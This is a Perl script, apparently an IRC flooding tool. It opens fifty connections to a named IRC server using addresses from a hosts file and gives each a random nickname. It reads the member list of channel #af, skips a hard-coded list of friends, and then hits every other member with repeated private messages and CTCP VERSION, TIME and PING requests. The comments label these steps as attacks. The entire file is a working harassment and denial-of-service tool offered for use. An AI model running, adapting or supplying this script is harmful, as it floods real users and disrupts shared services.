#!/usr/bin/perl

use IO::Socket;

$addr="irc.starlink.ru"; # irc server
$port=6667; # port

## Flood info
$num=1; # num attacks
$nummes=2; # num attacks on channel
$users=50; # number of users
$numsym=12; # how many symbols in nickname
$hosts='hosts'; # filename with hosts

@sym = ('a'..'z');

## User Information
$info="zlga";
$nick="zopa-";
$channel='#af';
$mes='hi!';

## Log Connection (1-yes, 0-no)
$log=0;
$|=1;

$last=$users-1;

print "channel: ${channel}\n";

open (INFO, $hosts);


for ($i=0; $i<$num; $i++){
	for ($c=0; $c<$users; $c++){
		
		$host=<INFO>;
		chomp ($host);
		
		$sock[$c] = IO::Socket::INET->new (PeerAddr => $addr,
                           PeerPort => $port,
                           LocalAddr => $host,
                           Proto    => "tcp",
                           Type     => SOCK_STREAM);


		$sock=$sock[$c];
		print ".";		

		binmode ($sock);
		$sock->autoflush();

		$nick[$c]=$nick;
		for ($d=0; $d<$numsym; $d++){
			$ident[$c].=$sym[int(rand(28))];
			$nick[$c].=$sym[int(rand(28))];
		}
		
		$sock->send ("NICK $nick[$c]\r\n");
		$sock->send ("USER $ident[$c] ${host} ${addr} :${info}\r\n");

		while (<$sock>) {
			check4ping ($sock, $_);
			print $_ if $log;
			last if ($_ =~ /376/);
			exit if ($_ =~ /^ERROR/);
		}

		$sock->send ("WHO :$nick[$c]\r\n");

		while (<$sock>) {
			check4ping ($sock, $_);
			print $_ if $log; 
			last if ($_ =~ /315/);
		}

	print $host."\n";

	}
		
	$sock=$sock[0];
	$sock->send ("JOIN ${channel}\r\n");
	while (<$sock>) {
		check4ping ($sock, $_);
		if ($_ =~ /^[^ ]*? 353/){
			($dop, $dop, $info)=split (/:/, $_);
			chop ($info); chop ($info);
			(@info)=split (/ /,$info);
			
			foreach $name (@info){
				$name=substr ($name, 1, (length($name)-1)) if ($name=~/^[\+\@]/);
				push (@users, $name) unless (look4user($name));
			}
		}
		last if ($_ =~ /End of \/?NAMES list/i);
	}

	$sock->send ("PART ${channel}\r\n");
	
	for ($d=1; $d<=$nummes; $d++){
	
		foreach $user (@users){
## 1st attack
			for ($c=0; $c<$users; $c++){
				$sock=$sock[$c];
				$time=gmtime();
				$sock->send ("PRIVMSG ${user} :$mes\r\n");
			}
	
## 2nd attack
			select (undef, undef, undef, 2);
			for ($c=0; $c<$users; $c++){
				$sock=$sock[$c];
				$sock->send ("PRIVMSG ${user} :".chr(1)."VERSION".chr(1)."\r\n");
			}

## 3rd attack
			select (undef, undef, undef, 4);
			for ($c=0; $c<$users; $c++){
				$sock=$sock[$c];
				$sock->send ("PRIVMSG ${user} :".chr(1)."TIME".chr(1)."\r\n");
			}

## 4th attack
			select (undef, undef, undef, 4);
			for ($c=0; $c<$users; $c++){
				$sock=$sock[$c];
				$sock->send ("PRIVMSG ${user} :".chr(1)."PING ${time}".chr(1)."\r\n");
			}
			
		}
	}
	
	for ($c=0; $c<$users; $c++){
		$sock=$sock[$c];
		close ($sock);
	}

}

close (INFO);


## Test for PING
sub check4ping{
	my ($sock, $data)=@_;
	my ($dop, $server);

	if ($data =~ /^PING/i) {
		($dop, $server) = split (/:/, $data);
		$sock->send ("PONG $server\r\n");
	}
}

## FriendList
sub look4user{
	my ($user)=@_;
	my (@list, $find, $data);
	push (@list, 'Gibbon', 'SideX', 'Igoreshka', '_RS_', 'Deil', 'Ch1ck', 'Spider[]', 'CuTTer');
	$find=0;
	
	foreach $data (@list){
		$find=1 if ($user eq $data);
	}
	return ($find);  

}
